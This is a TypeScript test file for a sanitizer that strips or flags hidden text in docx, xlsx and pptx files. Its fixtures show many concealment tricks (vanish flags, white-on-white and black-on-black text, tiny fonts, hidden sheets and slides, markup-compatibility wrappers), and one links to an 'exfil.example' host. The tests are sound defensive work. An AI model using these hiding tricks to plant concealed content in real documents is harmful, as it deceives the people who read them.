      `<w:p><x:del ${x} x:id="1" x:author="a"><x:r><x:delText>XDELSENTINEL</x:delText></x:r></x:del></w:p>` +
      `<w:p><x:r ${x}><x:instrText>XINSTRSENTINEL</x:instrText></x:r></w:p>` +
      `<w:p><x:r ${x}><x:object><x:control x:name="XOBJECTSENTINEL"/></x:object></x:r></w:p>`
    await disarmed(docx({ body }), MIME.docx, [
      'XVANISHSENTINEL',
      'XDELSENTINEL',
      'XINSTRSENTINEL',
      'XOBJECTSENTINEL',
    ])
  })

  it('a default-namespace document: unprefixed WordprocessingML elements', async () => {
    const body = `<p xmlns="${NS.w}"><r><t>VISIBLE</t></r><r><rPr><vanish/></rPr><t>DEFAULTNSSENTINEL</t></r></p>`
    await disarmed(docx({ body }), MIME.docx, ['DEFAULTNSSENTINEL'])
  })

  it('wp, pic, r and mc under other prefixes', async () => {
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:drawing><q:inline xmlns:q="${NS.wp}"><q:docPr id="1" name="d" hidden="1"/>` +
      `<a:graphic><a:graphicData uri="x"><wps:wsp><wps:txbx><w:txbxContent>${para('QDOCPRSENTINEL')}</w:txbxContent></wps:txbx></wps:wsp></a:graphicData></a:graphic></q:inline></w:drawing></w:r></w:p>` +
      `<w:p><w:r><w:drawing><wp:inline><wp:docPr id="2" name="d"/><a:graphic><a:graphicData uri="x"><z:pic xmlns:z="${NS.pic}"><z:nvPicPr><z:cNvPr id="3" name="d" descr="ZDESCRSENTINEL"/></z:nvPicPr></z:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>` +
      `<w:p><w:hyperlink xmlns:rel="${NS.r}" rel:id="rIdExt">${run('LINKKEPT')}</w:hyperlink></w:p>` +
      `<w:p>${inAlternateContent(run('ALTSENTINEL', '<w:vanish/>'), 'fallback', run('ALTOTHER'), 'alt')}</w:p>`
    await disarmed(
      docx({
        body,
        docRels: [
          { id: 'rIdExt', type: RT.hyperlink, target: 'https://exfil.example/', external: true },
        ],
      }),
      MIME.docx,
      ['QDOCPRSENTINEL', 'ZDESCRSENTINEL', 'rIdExt', 'ALTSENTINEL'],
    )
  })

  it('the w prefix bound to ANOTHER namespace is not WordprocessingML', async () => {
    const body = `<w:p>${run('VISIBLE')}<w:r><w:rPr><w:vanish xmlns:w="urn:not-wordprocessingml"/></w:rPr><w:t>NOTWMLKEPT</w:t></w:r></w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(everything(out.bytes)).toContain('NOTWMLKEPT')
  })

  it('spreadsheet and presentation rules under other prefixes', async () => {
    const sheet = `<sheetData><x:row xmlns:x="${NS.s}" r="1" x:dummy="1" hidden="1"><x:c r="A1" t="str"><x:f>XFSENTINEL</x:f><x:v>VISIBLE</x:v></x:c></x:row></sheetData>`
    const s = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }] }), MIME.xlsx, [
      'XFSENTINEL',
    ])
    expect(s.counted).toEqual({ 'hidden-flag': 1 })
    const pShape = `<k:sp xmlns:k="${NS.p}"><k:nvSpPr><k:cNvPr id="3" name="s" hidden="1"/><k:cNvSpPr/><k:nvPr/></k:nvSpPr><k:txBody><a:bodyPr/><a:p><a:r><a:t>KSHAPESENTINEL</a:t></a:r></a:p></k:txBody></k:sp>`
    await disarmed(pptx({ slides: [{ shapes: shape('VISIBLE') + pShape }] }), MIME.pptx, [
      'KSHAPESENTINEL',
    ])
  })
})

// ============================================================================
// Refusals: the disarm throws rather than returning something it did not finish
// ============================================================================

// ============================================================================
// #482 review: the fix round's pins, one per finding (amendments A9–A13)
// ============================================================================

/** CPU time of `f`, minimum of 3 passes — interference only ever lengthens it. */
async function cpuMs(f: () => Promise<unknown>): Promise<number> {
  let best = Infinity
  for (let k = 0; k < 3; k++) {
    const c = process.cpuUsage()
    await f().catch(() => undefined)
    const d = process.cpuUsage(c)
    best = Math.min(best, (d.user + d.system) / 1000)
  }
  return best
}

describe('#482 F1 (A9): markup compatibility runs first', () => {
  it('K1: runs inside an mc:Ignorable wrapper are dropped with it', async () => {
    const body =
      `<w:p xmlns:x="urn:junk" mc:Ignorable="x">${run('VISIBLE')}` +
      `<x:wrap>${run('K1SENTINEL')}</x:wrap></w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, ['K1SENTINEL', 'x:wrap'])
    expect(out.removed.unknownMarkup).toBe(1)
  })

  it('K2: w rebound to a junk URI inside such a wrapper', async () => {
    const body =
      para('VISIBLE') +
      `<w:p><x:wrap xmlns:x="urn:junk"><w:r xmlns:w="urn:junk2"><w:t>K2SENTINEL</w:t></w:r></x:wrap></w:p>`
    await disarmed(docx({ body }), MIME.docx, ['K2SENTINEL'])
  })

  it('K3: an element of an unknown, non-ignorable namespace', async () => {
    const body = `<w:p>${run('VISIBLE')}<y:block xmlns:y="urn:unknown">${run('K3SENTINEL')}</y:block></w:p>`
    await disarmed(docx({ body }), MIME.docx, ['K3SENTINEL'])
  })

  it('K6: a Strict-namespace element in a transitional package; a Strict root is refused', async () => {
    const strict = 'http://purl.oclc.org/ooxml/wordprocessingml/main'
    const body = `${para('VISIBLE')}<s:p xmlns:s="${strict}"><s:r><s:t>K6SENTINEL</s:t></s:r></s:p>`
    await disarmed(docx({ body }), MIME.docx, ['K6SENTINEL'])
    const root = buildPackage({
      main: {
        name: 'word/document.xml',
        type: CT.docxMain,
        body: `<w:document xmlns:w="${strict}"><w:body>${para('K6ROOTSENTINEL')}</w:body></w:document>`,
      },
    })
    expect(await refusalOf(ooxmlDisarm(root, MIME.docx))).toBe('content-type')
  })

  it('G4: a w:vanish inside mc:AlternateContent inside w:rPr', async () => {
    const body =
      `<w:p>${run('VISIBLE')}<w:r><w:rPr>${inAlternateContent('<w:vanish/>', 'choice')}</w:rPr>` +
      `<w:t>G4SENTINEL</w:t></w:r></w:p>`
    await disarmed(docx({ body }), MIME.docx, ['G4SENTINEL'])
  })

  it('G5: the whole w:rPr inside mc:AlternateContent in the run', async () => {
    const body =
      `<w:p>${run('VISIBLE')}<w:r>${inAlternateContent('<w:rPr><w:vanish/></w:rPr>', 'choice')}` +
      `<w:t>G5SENTINEL</w:t></w:r></w:p>`
    await disarmed(docx({ body }), MIME.docx, ['G5SENTINEL'])
  })

  it('G6: a style’s vanish inside mc:AlternateContent in its w:rPr', async () => {
    const styles = wStyles(
      DOCX_STYLES_NORMAL +
        `<w:style w:type="character" w:styleId="Ghost"><w:rPr>` +
        `${inAlternateContent('<w:vanish/>', 'choice', '', 'mcx')}</w:rPr></w:style>`,
    )
    const body = `<w:p>${run('VISIBLE')}${run('G6SENTINEL', '<w:rStyle w:val="Ghost"/>')}</w:p>`
    await disarmed(docx({ body, styles }), MIME.docx, ['G6SENTINEL'])
  })

  it('X11: a row in a foreign namespace, with hidden="1"', async () => {
    const sheet =
      `<sheetData>${row(1, ['VISIBLE'])}<f:row xmlns:f="urn:foreign" r="2" hidden="1">` +
      `<c r="A2" t="inlineStr"><is><t>X11SENTINEL</t></is></c></f:row></sheetData>`
    const out = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }] }), MIME.xlsx, [
      'X11SENTINEL',
    ])
    expect(out.removed.unknownMarkup).toBe(1)
  })
})

describe('#482 F2: the rules cost CPU linear in the part', () => {
  /**
   * The reviewer's shape — open fields, then runs — at 30,000 of each, so
   * it fits the node budget and reaches the field rule: before the fix, each
   * run scanned both stacks (quadratic: 5.8 s of CPU at 60,000); now the
   * field state is O(1) a node and the 257th open field is refused.
   */
  it('2(a): 30,000 open fields then 30,000 runs costs no more than the same-size part without them', async () => {
    const fields =
      '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>'.repeat(
        30_000,
      )
    const runs = Array.from({ length: 30_000 }, (_, i) => `<w:r><w:t>${i}</w:t></w:r>`).join('')
    const bytes = docx({ body: `<w:p>${fields}${runs}</w:p>` })
    expect(await refusalOf(ooxmlDisarm(bytes, MIME.docx))).toBe('content-type')
    // Relative, not absolute: CI's runners are ~3× slower than a laptop, so
    // the review's 500 ms held here and not there. The baseline is a part of
    // the same node count with no fields; quadratic field state is many times it.
    const base = docx({
      body: `<w:p>${Array.from({ length: 90_000 }, (_, i) => `<w:r><w:t>${i}</w:t></w:r>`).join('')}</w:p>`,
    })
    const ratio =
      (await cpuMs(() => ooxmlDisarm(bytes, MIME.docx))) /
      (await cpuMs(() => ooxmlDisarm(base, MIME.docx)))
    expect(ratio).toBeLessThan(2)
  }, 120_000)

  it('2(a): fields nest 256 deep, and the 257th begin is refused', async () => {
    const begins = (n: number) => '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'.repeat(n)
    await disarmed(
      docx({ body: para('VISIBLE') + `<w:p>${begins(256)}${run('X')}</w:p>` }),
      MIME.docx,
      [],
    )
    expect(
      await refusalOf(ooxmlDisarm(docx({ body: `<w:p>${begins(257)}</w:p>` }), MIME.docx)),
    ).toBe('content-type')
  })

  it('2(b): 255-deep default chains over 60,000 runs cost no more than the same part without them', async () => {
    const chain = (type: string, p: string) =>
      Array.from(
        { length: 255 },
        (_, i) =>
          `<w:style w:type="${type}"${i === 0 ? ' w:default="1"' : ''} w:styleId="${p}${i}">` +
          (i < 254 ? `<w:basedOn w:val="${p}${i + 1}"/>` : '') +
          '</w:style>',
      ).join('')
    const styles = wStyles(chain('character', 'C') + chain('paragraph', 'P') + chain('table', 'T'))
    // 60,000 runs: at 20,000 the memo-less code stayed under the bound (#482 delta F6).
    const rsid = noise(8 * 60_000, 5)
    const runs = Array.from(
      { length: 60_000 },
      (_, i) => `<w:r w:rsidR="${rsid.slice(8 * i, 8 * i + 8)}"><w:t>x</w:t></w:r>`,
    ).join('')
    const body =
      '<w:tbl><w:tblGrid><w:gridCol/></w:tblGrid><w:tr><w:tc>' +
      `<w:p>${run('VISIBLE')}${runs}</w:p></w:tc></w:tr></w:tbl>`
    const bytes = docx({ body, styles })
    expect(everything((await ooxmlDisarm(bytes, MIME.docx)).bytes)).toContain('VISIBLE')
    // Relative, not absolute (see 2(a)): the baseline is the same part with
    // the same styles unchained, so only the chains' resolution differs.
    const flat = wStyles(
      ['character', 'paragraph', 'table']
        .flatMap((type, t) =>
          Array.from(
            { length: 255 },
            (_, i) =>
              `<w:style w:type="${type}"${i === 0 ? ' w:default="1"' : ''} w:styleId="${'CPT'[t]}${i}"/>`,
          ),
        )
        .join(''),
    )
    const base = docx({ body, styles: flat })
    const ratio =
      (await cpuMs(() => ooxmlDisarm(bytes, MIME.docx))) /
      (await cpuMs(() => ooxmlDisarm(base, MIME.docx)))
    expect(ratio).toBeLessThan(1.3)
  }, 120_000)
})

describe('#482 F3 (A13): a basedOn chain cut off by the bound counts as hiding', () => {
  it('G2: vanish on the 300th style hides; a 100-deep chain without it does not', async () => {
    const chain = (p: string, n: number, last: string) =>
      Array.from(
        { length: n },
        (_, i) =>
          `<w:style w:type="character" w:styleId="${p}${i}">` +
          (i < n - 1 ? `<w:basedOn w:val="${p}${i + 1}"/>` : last) +
          '</w:style>',
      ).join('')
    const styles = wStyles(
      DOCX_STYLES_NORMAL + chain('A', 300, '<w:rPr><w:vanish/></w:rPr>') + chain('B', 100, ''),
    )
    const body =
      `<w:p>${run('VISIBLE', '<w:rStyle w:val="B0"/>')}` +
      `${run('G2SENTINEL', '<w:rStyle w:val="A0"/>')}</w:p>`
    await disarmed(docx({ body, styles }), MIME.docx, ['G2SENTINEL'])
  })
})

describe('#482 F4 (A11): a separator-type note keeps only its separator marks', () => {
  const sep = (type: string, text: string) =>
    `<w:footnotes xmlns:w="${NS.w}"><w:footnote w:type="${type}" w:id="-1"><w:p>` +
    `<w:r><w:separator/></w:r><w:r><w:t>${text}</w:t></w:r></w:p></w:footnote></w:footnotes>`

  it('M1: text inside a separator footnote, no footnote references', async () => {
    const out = await disarmed(
      docx({ body: para('VISIBLE'), footnotes: sep('separator', 'M1SENTINEL') }),
      MIME.docx,
      ['M1SENTINEL'],
    )
    expect(everything(out.bytes)).toContain('w:separator')
    expect(out.removed.separatorText).toBe(1)
  })

  it('M2: text inside a continuationNotice footnote', async () => {
    await disarmed(
      docx({ body: para('VISIBLE'), footnotes: sep('continuationNotice', 'M2SENTINEL') }),
      MIME.docx,
      ['M2SENTINEL'],
    )
  })
})

describe('#482 F5 (A12): visibility is read only from the list that names it', () => {
  it('X3: a worksheet <sheets> never lists, named only in an extLst <sheet>', async () => {
    await disarmed(
      xlsx({
        sheets: [
          { name: 'Shown', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` },
          {
            name: 'Unlisted',
            unlisted: true,
            xml: `<sheetData>${row(1, ['X3SENTINEL'])}</sheetData>`,
          },
        ],
        // Two decoys: the right name at the wrong depth, and the right depth in another namespace.
        workbookExtra:
          '<extLst><ext uri="{decoy}"><sheet name="D" sheetId="9" r:id="rIdSheet2"/></ext></extLst>' +
          '<d:sheets xmlns:d="urn:decoy"><d:sheet name="D" sheetId="9" r:id="rIdSheet2"/></d:sheets>',
      }),
      MIME.xlsx,
      ['X3SENTINEL'],
    )
  })

  it('P8: a slide <p:sldIdLst> does not list, named only in a p:extLst <p:sldId>', async () => {
    await disarmed(
      pptx({
        slides: [{ shapes: shape('VISIBLE') }, { shapes: shape('P8SENTINEL'), unlisted: true }],
        presentationExtra:
          '<p:extLst><p:ext uri="{decoy}"><p:sldId id="300" r:id="rIdSlide2"/></p:ext></p:extLst>' +
          '<d:sldIdLst xmlns:d="urn:decoy"><d:sldId id="301" r:id="rIdSlide2"/></d:sldIdLst>',
      }),
      MIME.pptx,
      ['P8SENTINEL'],
    )
  })
})

describe('#482 F6 (A10): equivalent forms of the counted categories count too', () => {
  const xf = (numFmtId: number, fontId: number, fillId: number) =>
    `<xf numFmtId="${numFmtId}" fontId="${fontId}" fillId="${fillId}"/>`
  const cell = (s: number, t: string) =>
    `<sheetData><row r="1"><c r="A1" s="${s}" t="inlineStr"><is><t>${t}</t></is></c></row></sheetData>`
  const counts = async (sheet: string, styles: string, sharedStrings?: string) =>
    (
      await disarmed(
        xlsx({ sheets: [{ name: 'S', xml: sheet }], styles, sharedStrings }),
        MIME.xlsx,
        [],
        'KEPT',
      )
    ).counted

  it('X6: a format of empty literals, "";"";"";""', async () => {
    const styles = sStyles({
      numFmts:
        '<numFmt numFmtId="164" formatCode="&quot;&quot;;&quot;&quot;;&quot;&quot;;&quot;&quot;"/>',
      xfs: [xf(0, 0, 0), xf(164, 0, 0)],
    })
    expect(await counts(cell(1, 'KEPT'), styles)).toEqual({ 'hidden-flag': 1 })
  })

  it('X7: a [White] format section', async () => {
    const styles = sStyles({
      numFmts: '<numFmt numFmtId="165" formatCode="[White]@"/>',
      xfs: [xf(0, 0, 0), xf(165, 0, 0)],
    })
    expect(await counts(cell(1, 'KEPT'), styles)).toEqual({ 'colour-contrast': 1 })
  })

  it('X8: font rgb on a solid fill given as indexed — white on 9, and black on 8', async () => {
    // Black on black is the case that needs the palette: unresolved, an
    // indexed fill reads as "no fill", and a white font would count anyway.
    const styles = sStyles({
      fonts: [
        '<font><sz val="11"/></font>',
        '<font><color rgb="FFFFFFFF"/></font>',
        '<font><color rgb="FF000000"/></font>',
      ],
      fills: [
        '<fill><patternFill patternType="none"/></fill>',
        '<fill><patternFill patternType="gray125"/></fill>',
        '<fill><patternFill patternType="solid"><fgColor indexed="9"/></patternFill></fill>',
        '<fill><patternFill patternType="solid"><fgColor indexed="8"/></patternFill></fill>',
      ],
      xfs: [xf(0, 0, 0), xf(0, 1, 2), xf(0, 2, 3)],
    })
    expect(await counts(cell(1, 'KEPT'), styles)).toEqual({ 'colour-contrast': 1 })
    expect(await counts(cell(2, 'KEPT'), styles)).toEqual({ 'colour-contrast': 1 })
  })

  it('X9: a white rich-text run in sharedStrings, in a cell with no fill', async () => {
    const styles = sStyles({ xfs: [xf(0, 0, 0)] })
    const sst =
      `<sst xmlns="${NS.s}"><si><r><t>KEPT</t></r><r><rPr><color rgb="FFFFFFFF"/></rPr>` +
      '<t>X9SENTINEL</t></r></si></sst>'
    const sheet = '<sheetData><row r="1"><c r="A1" t="s"><v>0</v></c></row></sheetData>'
    expect(await counts(sheet, styles, sst)).toEqual({ 'colour-contrast': 1 })
  })

  it('X4, X5: a row height of 0.1 and a column width of 0.01', async () => {
    const sheet =
      '<cols><col min="1" max="1" width="0.01"/></cols>' +
      `<sheetData>${row(1, ['KEPT'], ' ht="0.1" customHeight="1"')}</sheetData>`
    expect(await counts(sheet, sStyles({ xfs: [xf(0, 0, 0)] }))).toEqual({
      'too-small': 2,
    })
  })

  it('X10: a hidden workbook window', async () => {
    const hidden = await disarmed(
      xlsx({
        sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }],
        workbookExtra: '<bookViews><workbookView visibility="hidden"/></bookViews>',
      }),
      MIME.xlsx,
      [],
    )
    expect(hidden.counted).toEqual({ 'hidden-flag': 1 })
  })

  it('W2: near-white text, FFFFFE', async () => {
    const body = `<w:p>${run('VISIBLE')}${run('KEPT', '<w:color w:val="FFFFFE"/>')}</w:p>`
    expect((await disarmed(docx({ body }), MIME.docx, [])).counted).toEqual({
      'colour-contrast': 1,
    })
  })

  it('W3: black text on black shading, the run’s or the paragraph’s', async () => {
    const black = '<w:color w:val="000000"/>'
    const body =
      `<w:p>${run('VISIBLE')}${run('KEPT', `${black}<w:shd w:val="clear" w:fill="000000"/>`)}</w:p>` +
      `<w:p><w:pPr><w:shd w:val="clear" w:fill="000000"/></w:pPr>${run('KEPT', black)}</w:p>`
    expect((await disarmed(docx({ body }), MIME.docx, [])).counted).toEqual({
      'colour-contrast': 2,
    })
  })

  it('W5: complex-script size 1 pt (w:szCs)', async () => {
    const body = `<w:p>${run('VISIBLE')}${run('KEPT', '<w:cs/><w:szCs w:val="2"/>')}</w:p>`
    expect((await disarmed(docx({ body }), MIME.docx, [])).counted).toEqual({ 'too-small': 1 })
  })

  it('P3, P4: pptx text with a:noFill, and with alpha 0', async () => {
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE') +
              shape('KEPT', { id: 3, rPr: '<a:rPr><a:noFill/></a:rPr>' }) +
              shape('KEPT', {
                id: 4,
                rPr: '<a:rPr><a:solidFill><a:srgbClr val="000000"><a:alpha val="0"/></a:srgbClr></a:solidFill></a:rPr>',
              }),
          },
        ],
      }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'colour-contrast': 2 })
  })
})

describe('#482 delta: five more same-class misses, and a stray w:t', () => {
  it('F1: a hidden window inside a rendered mc:Choice, and nested deeper, is counted', async () => {
    const view = '<workbookView visibility="hidden"/>'
    // A Choice Excel renders: it requires x14, which the workbook understands.
    const ac = (inner: string) =>
      `<mc:AlternateContent><mc:Choice xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" Requires="x14">${inner}</mc:Choice><mc:Fallback/></mc:AlternateContent>`
    for (const extra of [
      ac(`<bookViews>${view}</bookViews>`),
      `<bookViews>${ac(view)}</bookViews>`,
    ]) {
      const out = await disarmed(
        xlsx({
          sheets: [{ name: 'S', xml: `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` }],
          workbookExtra: extra,
        }),
        MIME.xlsx,
        [],
      )
      expect(out.counted).toEqual({ 'hidden-flag': 1 })
    }
  })

  it('F2: black text on a black w:highlight', async () => {
    const body =
      `<w:p>${run('VISIBLE')}` +
      `${run('KEPT', '<w:color w:val="000000"/><w:highlight w:val="black"/>')}</w:p>`
    expect((await disarmed(docx({ body }), MIME.docx, [])).counted).toEqual({
      'colour-contrast': 1,
    })
  })

  it('F3: pptx text with an all-white a:gradFill', async () => {
    const grad =
      '<a:rPr><a:gradFill><a:gsLst><a:gs pos="0"><a:srgbClr val="FFFFFF"/></a:gs>' +
      '<a:gs pos="100000"><a:srgbClr val="FFFFFF"/></a:gs></a:gsLst></a:gradFill></a:rPr>'
    const out = await disarmed(
      pptx({ slides: [{ shapes: shape('VISIBLE') + shape('KEPT', { id: 3, rPr: grad }) }] }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  it('F4: list-style defaults apply to a run with no a:rPr', async () => {
    const sp =
      '<p:sp><p:nvSpPr><p:cNvPr id="3" name="s"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr/>' +
      '<p:txBody><a:bodyPr/><a:lstStyle><a:lvl1pPr><a:defRPr sz="100"><a:solidFill>' +
      '<a:srgbClr val="FFFFFF"/></a:solidFill></a:defRPr></a:lvl1pPr></a:lstStyle>' +
      '<a:p><a:r><a:t>KEPT</a:t></a:r></a:p></p:txBody></p:sp>'
    const out = await disarmed(pptx({ slides: [{ shapes: shape('VISIBLE') + sp }] }), MIME.pptx, [])
    expect(out.counted).toEqual({ 'colour-contrast': 1, 'too-small': 1 })
  })

  it('F5: a conditional-format dxf with a white font', async () => {
    const styles =
      `<styleSheet xmlns="${NS.s}"><fonts><font><color rgb="FF000000"/></font></fonts>` +
      '<fills><fill><patternFill patternType="none"/></fill></fills>' +
      '<cellXfs><xf numFmtId="0" fontId="0" fillId="0"/></cellXfs>' +
      '<dxfs><dxf><font><color rgb="FFFFFFFF"/></font></dxf></dxfs></styleSheet>'
    const sheet =
      `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` +
      '<conditionalFormatting sqref="A1"><cfRule type="expression" dxfId="0" priority="1">' +
      '<formula>TRUE()</formula></cfRule></conditionalFormatting>'
    const out = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }], styles }), MIME.xlsx, [])
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  it('F7: a w:t outside any run goes, in the body and in a separator note', async () => {
    const out = await disarmed(
      docx({
        body: `${para('VISIBLE')}<w:p><w:t>STRAYSENTINEL</w:t></w:p>`,
        footnotes:
          `<w:footnotes xmlns:w="${NS.w}"><w:footnote w:type="separator" w:id="-1"><w:p>` +
          '<w:r><w:separator/></w:r><w:t>STRAYNOTESENTINEL</w:t></w:p></w:footnote></w:footnotes>',
      }),
      MIME.docx,
      ['STRAYSENTINEL', 'STRAYNOTESENTINEL'],
    )
    expect(out.removed.strayText).toBe(2)
  })
})

describe('#482 re-check: the cascade, list levels, and the dxf fill', () => {
  const kept = '<w:color w:val="000000"/><w:highlight w:val="black"/>'

  it('F1: black on a black highlight supplied by a character style', async () => {
    const styles = wStyles(
      DOCX_STYLES_NORMAL +
        `<w:style w:type="character" w:styleId="Ink"><w:rPr>${kept}</w:rPr></w:style>`,
    )
    const body = `<w:p>${run('VISIBLE')}${run('KEPT', '<w:rStyle w:val="Ink"/>')}</w:p>`
    expect((await disarmed(docx({ body, styles }), MIME.docx, [])).counted).toEqual({
      'colour-contrast': 1,
    })
  })

  it('F1: black on a black highlight supplied by docDefaults', async () => {
    const styles = wStyles(
      DOCX_STYLES_NORMAL +
        `<w:docDefaults><w:rPrDefault><w:rPr>${kept}</w:rPr></w:rPrDefault></w:docDefaults>`,
    )
    const body = `<w:p>${run('VISIBLE', '<w:highlight w:val="yellow"/>')}${run('KEPT')}</w:p>`
    expect((await disarmed(docx({ body, styles }), MIME.docx, [])).counted).toEqual({
      'colour-contrast': 1,
    })
  })

  it('F2: a paragraph at lvl="1" takes lvl2pPr defaults; a level-1 paragraph does not', async () => {
    const body = (pPr: string) =>
      '<p:sp><p:nvSpPr><p:cNvPr id="3" name="s"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr/>' +
      '<p:txBody><a:bodyPr/><a:lstStyle><a:lvl2pPr><a:defRPr sz="100"><a:solidFill>' +
      '<a:srgbClr val="FFFFFF"/></a:solidFill></a:defRPr></a:lvl2pPr></a:lstStyle>' +
      `<a:p>${pPr}<a:r><a:t>KEPT</a:t></a:r></a:p></p:txBody></p:sp>`
    const at2 = await disarmed(
      pptx({ slides: [{ shapes: shape('VISIBLE') + body('<a:pPr lvl="1"/>') }] }),
      MIME.pptx,
      [],
    )
    expect(at2.counted).toEqual({ 'colour-contrast': 1, 'too-small': 1 })
    const at1 = await disarmed(
      pptx({ slides: [{ shapes: shape('VISIBLE') + body('') }] }),
      MIME.pptx,
      [],
    )
    expect(at1.counted).toEqual({})
  })

  it('F3: a conditional-format dxf whose solid fill equals the base font colour', async () => {
    const styles =
      `<styleSheet xmlns="${NS.s}"><fonts><font><color rgb="FF000000"/></font></fonts>` +
      '<fills><fill><patternFill patternType="none"/></fill></fills>' +
      '<cellXfs><xf numFmtId="0" fontId="0" fillId="0"/></cellXfs>' +
      '<dxfs><dxf><fill><patternFill patternType="solid"><fgColor rgb="FF000000"/></patternFill></fill></dxf></dxfs></styleSheet>'
    const sheet =
      `<sheetData>${row(1, ['VISIBLE'])}</sheetData>` +
      '<conditionalFormatting sqref="A1"><cfRule type="expression" dxfId="0" priority="1">' +
      '<formula>TRUE()</formula></cfRule></conditionalFormatting>'
    const out = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }], styles }), MIME.xlsx, [])
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })
})

// ============================================================================
// #492: the fail-closed effective-visibility resolver (colour, fill, size)
// ============================================================================

/**
 * The resolver replaces #482's per-property concealment counters with ONE
 * effective-visibility computation per run: resolve the run's effective
 * foreground colour, background (shading, highlight, cell or shape fill,
 * gradient stops included), transparency and size through its format's FULL
 * cascade, then count the run as concealed UNLESS its text is provably visibly
 * distinct. The predicate is FAIL-CLOSED (#492 decision 1): any rendering
 * property outside the resolver's explicit allowlist makes the run
 * not-provably-visible, so an unknown mechanism lands in `counted`, never in
 * `'removed'`. A contrast threshold keeps ordinary styling visibly distinct.
 * The counted keys are exactly the five reasons of decision 3:
 * `colour-contrast`, `too-small`, `hidden-flag`, `layout`, `unknown-property`.
 */
const X_DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'

/** A minimal DrawingML theme, with `lt1` configurable for the theme pin. */
const aTheme = (lt1: string): string =>
  `${X_DECL}<a:theme xmlns:a="${NS.a}" name="T"><a:themeElements>` +
  `<a:clrScheme name="S"><a:dk1><a:sysClr val="windowText" lastClr="000000"/></a:dk1>` +
  `<a:lt1><a:sysClr val="window" lastClr="${lt1}"/></a:lt1>` +
  '<a:dk2><a:srgbClr val="1F497D"/></a:dk2><a:lt2><a:srgbClr val="EEECE1"/></a:lt2>' +
  [1, 2, 3, 4, 5, 6].map((n) => `<a:accent${n}><a:srgbClr val="4F81BD"/></a:accent${n}>`).join('') +
  '<a:hlink><a:srgbClr val="0000FF"/></a:hlink><a:folHlink><a:srgbClr val="800080"/></a:folHlink>' +
  '</a:clrScheme></a:themeElements></a:theme>'

/** A theme with a fill scheme, for the `fillRef` pin. */
const FMT_THEME = (fill: string): string =>
  `${X_DECL}<a:theme xmlns:a="${NS.a}" name="T"><a:themeElements>` +
  '<a:clrScheme name="S"><a:dk1><a:sysClr val="windowText" lastClr="000000"/></a:dk1>' +
  '<a:lt1><a:sysClr val="window" lastClr="FFFFFF"/></a:lt1>' +
  '<a:dk2><a:srgbClr val="1F497D"/></a:dk2><a:lt2><a:srgbClr val="EEECE1"/></a:lt2></a:clrScheme>' +
  '<a:fmtScheme name="F"><a:fillStyleLst>' +
  fill +
  '</a:fillStyleLst><a:lnStyleLst/><a:effectStyleLst/><a:bgFillStyleLst/></a:fmtScheme>' +
  '</a:themeElements></a:theme>'

/** A body-placeholder shape whose list style's level 1 hides its text. */
const WHITE_1PT =
  '<a:lvl1pPr><a:defRPr sz="100"><a:solidFill><a:srgbClr val="FFFFFF"/></a:solidFill></a:defRPr></a:lvl1pPr>'
/** Grey 24 pt at level 1 — ordinary, visibly distinct text. */
const GREY_24 =
  '<a:lvl1pPr><a:defRPr sz="2400"><a:solidFill><a:srgbClr val="595959"/></a:solidFill></a:defRPr></a:lvl1pPr>'

/** A placeholder shape with a level-1 list style. */
const phShape = (lstStyle: string, ph = 'body'): string =>
  `<p:sp><p:nvSpPr><p:cNvPr id="2" name="P"/><p:cNvSpPr/><p:nvPr><p:ph type="${ph}"/></p:nvPr></p:nvSpPr>` +
  `<p:spPr/><p:txBody><a:bodyPr/><a:lstStyle>${lstStyle}</a:lstStyle>` +
  '<a:p><a:r><a:t>STYLETEXT</a:t></a:r></a:p></p:txBody></p:sp>'

/** A run with no properties of its own, in a paragraph whose `a:pPr/a:defRPr` hides it. */
const paraDefShape = (text: string): string =>
  '<p:sp><p:nvSpPr><p:cNvPr id="7" name="D"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr/>' +
  '<p:txBody><a:bodyPr/><a:p><a:pPr><a:defRPr sz="100"><a:solidFill>' +
  '<a:srgbClr val="FFFFFF"/></a:solidFill></a:defRPr></a:pPr>' +
  `<a:r><a:t>${text}</a:t></a:r></a:p></p:txBody></p:sp>`

const CLR_MAP =
  '<p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>'

/** A PresentationML style part: layouts, masters and notes masters. */
const pStylePart = (root: string, spTree = '', after = '', bg = ''): string =>
  `${X_DECL}<p:${root} ${P_ROOT_NS}><p:cSld name="P">${bg ? `<p:bg>${bg}</p:bg>` : ''}` +
  `<p:spTree>${SP_TREE_HEAD}${spTree}</p:spTree></p:cSld>${after}</p:${root}>`

/** A master whose `bodyStyle` hides level-1 text. */
const MASTER_TXSTYLES =
  '<p:txStyles><p:titleStyle><a:lvl1pPr><a:defRPr sz="2400"/></a:lvl1pPr></p:titleStyle>' +
